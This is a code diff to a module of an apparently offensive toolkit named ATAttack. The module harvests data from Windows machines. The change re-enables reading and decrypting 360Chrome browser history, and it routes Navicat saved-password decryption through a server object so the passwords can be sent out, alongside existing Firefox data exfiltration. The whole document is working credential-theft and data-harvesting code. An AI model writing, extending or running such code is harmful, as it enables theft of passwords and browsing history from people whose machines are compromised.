@@ -4,9 +4,7 @@
 
 import win32api
 import win32con
-from ATAttack.framework.prints import *
 from ATAttack.utility.decrypt import *
-from ATAttack.enumeration.upload import upload
 from ATAttack.framework.constant import constant
 from ATAttack.enumeration.uninstall import query_results
 
@@ -16,7 +14,8 @@ command_list = []
 
 class Software:
 
-    def __init__(self):
+    def __init__(self,_server):
+        self._server = _server
         print '[*] Running history finder'
 
     def getpatch(self, llsit):
@@ -81,15 +80,16 @@ class Software:
         try:
             history_db = os.path.join(
                 constant.profile['LOCALAPPDATA'],u'360Chrome\\Chrome\\User Data\\Default\\history')
-            c = sqlite3.connect(history_db)
-            cursor = c.cursor()
-            select_statement = "SELECT urls.url FROM urls;"
-            cursor.execute(select_statement)
-            results = cursor.fetchall()
-            for i in results:
-                command_list.append(i[1])
-            c.close()
-            return list(set(command_list))
+            if os.path.exists(history_db):
+                c = sqlite3.connect(history_db)
+                cursor = c.cursor()
+                select_statement = "SELECT urls.url FROM urls;"
+                cursor.execute(select_statement)
+                results = cursor.fetchall()
+                for i in results:
+                    command_list.append(i[1])
+                c.close()
+                return list(set(command_list))
         except Exception:
             return False
 
@@ -113,13 +113,17 @@ class Software:
             output.send_firefox_data()
         else:
             pass
-        # print '[*] Finding histroy in 360Chrome'
-        # self.get_360c_history()
-        # output.get_decypt_360chrome()
-        if re.findall('Navicat+', Installation, re.S):
-            print "[*] Attempting to decrypt Navicat"
-            # upload().navicatpwd()
-        print_warning("Please wait while uploading ... ")
+        print '[*] Finding histroy in 360Chrome'
+        self.get_360c_history()
+        output.get_decypt_360chrome()
+
+        try:
+            if re.findall('Navicat+', Installation, re.S):
+                print "[*] Attempting to decrypt Navicat"
+                self._server.navicatpwd()
+        except Exception:
+            pass
+        # print_warning("Please wait while uploading ... ")
         log_tmp = list(set(command_list))
         for history in log_tmp:
             with open(constant.tmp_name, "a") as file:
